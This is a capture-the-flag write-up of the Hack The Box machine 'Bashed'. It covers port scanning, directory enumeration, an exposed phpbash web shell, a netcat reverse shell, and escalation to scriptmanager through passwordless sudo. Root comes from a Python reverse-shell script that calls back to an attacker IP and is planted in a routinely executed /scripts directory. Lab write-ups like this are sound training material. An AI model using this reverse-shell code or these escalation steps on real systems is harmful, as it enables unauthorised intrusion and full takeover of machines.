## Default Information
IP Address: 10.10.10.68\
OS: Linux


## Discovery
Before we start, let's first add the the IP address and host to our ```/etc/hosts``` file

```
10.10.10.68    bashed.htb
```

### Masscan
Firstly, we will use masscan to identify the open ports

```
┌──(kali㉿kali)-[~]
└─$ sudo masscan -p1-65535,U:1-65535 10.10.10.68 --rate=1000 -e tun0

[sudo] password for kali: 
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2021-09-28 13:30:32 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 80/tcp on 10.10.10.68 
```

### Nmap

Afterwards,we will use the open ports obtained from masscan to run a scan using nmap to enumerate the services operating behind each port. For this machine, only port 80 is open, which means that only web service is available on this machine.

| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 80	| http | Apache httpd 2.4.18 ((Ubuntu)) | Open |

### Gobuster
Next, we will use Gobuster to find the endpoints that are accessible from http://bashed.htb

```
──(kali㉿kali)-[~]
└─$ gobuster dir -u http://bashed.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -t 50
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://bashed.htb
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2021/09/28 09:31:43 Starting gobuster in directory enumeration mode
===============================================================
http://bashed.htb/uploads              (Status: 301) [Size: 310] [--> http://bashed.htb/uploads/]
http://bashed.htb/images               (Status: 301) [Size: 309] [--> http://bashed.htb/images/] 
http://bashed.htb/php                  (Status: 301) [Size: 306] [--> http://bashed.htb/php/] 
http://bashed.htb/css                  (Status: 301) [Size: 306] [--> http://bashed.htb/css/] 
http://bashed.htb/dev                  (Status: 301) [Size: 306] [--> http://bashed.htb/dev/]  
http://bashed.htb/js                   (Status: 301) [Size: 305] [--> http://bashed.htb/js/] 
http://bashed.htb/fonts                (Status: 301) [Size: 308] [--> http://bashed.htb/fonts/]  
http://bashed.htb/server-status        (Status: 403) [Size: 298]
```

We will also try to enumerate for VHosts using Gobuster. However, there doesn't seem to have any interesting outputs. 

## Exploit

### Spawning web shell
Navigating to http;//bashed.htb/dev, we notice that there are a few php files that can be accessed. Clicking on the ```phpbash.php``` file, we realize that we have spawned a web shell

![Spawning web shell](https://github.com/joelczk/writeups/blob/main/HTB/Images/Bashed/web_shell.PNG)

### Obtaining user flag

Using the web shell that we obtained, we will now get our user flag

```
www-data@bashed:/home# cd /home
www-data@bashed:/home# ls
arrexel
scriptmanager
www-data@bashed:/home# ls -la arrexel
total 36
drwxr-xr-x 4 arrexel arrexel 4096 Dec 4 2017 .
drwxr-xr-x 4 root root 4096 Dec 4 2017 ..
-rw------- 1 arrexel arrexel 1 Dec 23 2017 .bash_history
-rw-r--r-- 1 arrexel arrexel 220 Dec 4 2017 .bash_logout
-rw-r--r-- 1 arrexel arrexel 3786 Dec 4 2017 .bashrc
drwx------ 2 arrexel arrexel 4096 Dec 4 2017 .cache
drwxrwxr-x 2 arrexel arrexel 4096 Dec 4 2017 .nano
-rw-r--r-- 1 arrexel arrexel 655 Dec 4 2017 .profile
-rw-r--r-- 1 arrexel arrexel 0 Dec 4 2017 .sudo_as_admin_successful
-r--r--r-- 1 arrexel arrexel 33 Dec 4 2017 user.txt
www-data@bashed:/home# cd arrexel
www-data@bashed:/home/arrexel# cat user.txt
<Redacted user flag>
```

### Obtaining a reverse shell

Next we will first create a reverse shell command from the webshell. Intercepting the request, we can modify the body parameters of the request to obtain a reverse shell. 

![Creating reverse shell payload](https://github.com/joelczk/writeups/blob/main/HTB/Images/Bashed/reverse_shell.PNG)

Afterwhich, we will stabilize the shell

```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 3000                          
listening on [any] 3000 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.10.68] 55250
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@bashed:/var/www/html/dev$ export TERM=xterm
export TERM=xterm
www-data@bashed:/var/www/html/dev$ stty cols 132 rows 34
stty cols 132 rows 34
www-data@bashed:/var/www/html/dev$
```
### Privilege Escalation to scriptmanager
Next, we will execute ```sudo -l``` command to find out if we are able to execute any programs as sudo without password. We realize that we can execute commands as ```scriptmanager``` without any password. Knowing that, we will be able to escalate our privilege into ```scriptmanager```

```
www-data@bashed:/var/www/html/dev$ sudo -l
sudo -l
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
www-data@bashed:/var/www/html/dev$ sudo -u scriptmanager /bin/bash
sudo -u scriptmanager /bin/bash
scriptmanager@bashed:/var/www/html/dev$
```

At the base directory, we noticed that all the directories has root as the owner, except for the ```/script``` directory

```
scriptmanager@bashed:/$ ls -la
ls -la
total 88
drwxr-xr-x  23 root          root           4096 Dec  4  2017 .
drwxr-xr-x  23 root          root           4096 Dec  4  2017 ..
drwxr-xr-x   2 root          root           4096 Dec  4  2017 bin
drwxr-xr-x   3 root          root           4096 Dec  4  2017 boot
drwxr-xr-x  19 root          root           4240 Sep 28 02:25 dev
drwxr-xr-x  89 root          root           4096 Dec  4  2017 etc
drwxr-xr-x   4 root          root           4096 Dec  4  2017 home
lrwxrwxrwx   1 root          root             32 Dec  4  2017 initrd.img -> boot/initrd.img-4.4.0-62-generic
drwxr-xr-x  19 root          root           4096 Dec  4  2017 lib
drwxr-xr-x   2 root          root           4096 Dec  4  2017 lib64
drwx------   2 root          root          16384 Dec  4  2017 lost+found
drwxr-xr-x   4 root          root           4096 Dec  4  2017 media
drwxr-xr-x   2 root          root           4096 Feb 15  2017 mnt
drwxr-xr-x   2 root          root           4096 Dec  4  2017 opt
dr-xr-xr-x 180 root          root              0 Sep 28 02:25 proc
drwx------   3 root          root           4096 Dec  4  2017 root
drwxr-xr-x  18 root          root            520 Sep 28 06:25 run
drwxr-xr-x   2 root          root           4096 Dec  4  2017 sbin
drwxrwxr--   2 scriptmanager scriptmanager  4096 Sep 28 11:27 scripts
drwxr-xr-x   2 root          root           4096 Feb 15  2017 srv
dr-xr-xr-x  13 root          root              0 Sep 28 11:07 sys
drwxrwxrwt  10 root          root           4096 Sep 28 11:27 tmp
drwxr-xr-x  10 root          root           4096 Dec  4  2017 usr
drwxr-xr-x  12 root          root           4096 Dec  4  2017 var
lrwxrwxrwx   1 root          root             29 Dec  4  2017 vmlinuz -> boot/vmlinuz-4.4.0-62-generic
```

Afterwhich, we will navigate to the ```/scripts``` directory and check the permissions of the file. There is nothing much that catches my eyes, regarding the file permissions. However, what I do realize is that teh files are created quite recently. This gives us the idea that the files might be routinely executed.

```
scriptmanager@bashed:/$ cd /scripts
cd /scripts
scriptmanager@bashed:/scripts$ ls -la
ls -la
total 484
drwxrwxr--  2 scriptmanager scriptmanager   4096 Sep 28 11:27 .
drwxr-xr-x 23 root          root            4096 Dec  4  2017 ..
-rw-------  1 scriptmanager scriptmanager   4096 Sep 28 11:20 .test.py.1.swo
-rwxr-xr-x  1 scriptmanager scriptmanager    229 Sep 28 03:24 back.py
-rwxr-xr-x  1 scriptmanager scriptmanager    224 Sep 28 03:22 back2.py
-rwxr-xr-x  1 scriptmanager scriptmanager    222 Sep 28 03:15 backdoor
-rwxr-xr-x  1 scriptmanager scriptmanager    224 Sep 28 03:22 backdoor1.py
-rwxr-xr-x  1 scriptmanager scriptmanager 458110 Aug 16 18:59 linpeas.sh
-rw-r--r--  1 scriptmanager scriptmanager     58 Dec  4  2017 test.py
-rw-r--r--  1 root          root              12 Sep 28 11:28 test.txt
scriptmanager@bashed:/scripts$ 
```

### Privilege Escalation to root
All we have to do is to save the reverse shell code in a python file in the ```/scripts``` directory and the code will be executed to create a reverse shell.

```
import socket,os,pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.16.5",3000))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/bash")
```

Now, we will have to stabilize the shell.

```
──(kali㉿kali)-[~/Desktop/PE]
└─$ nc -nlvp 3000                                                                   1 ⚙
listening on [any] 3000 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.10.68] 55274
root@bashed:/scripts# python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
root@bashed:/scripts# export TERM=xterm
export TERM=xterm
root@bashed:/scripts# stty cols 132 rows 34
stty cols 132 rows 34
root@bashed:/scripts# 
```

### Obtaining root flag
All that is left for us to do is to obtain the root flag

```
root@bashed:/scripts# cd /root
cd /root
root@bashed:~# ls
ls
root.txt
root@bashed:~# cat root.txt
cat root.txt
<Redacted root flag>
```
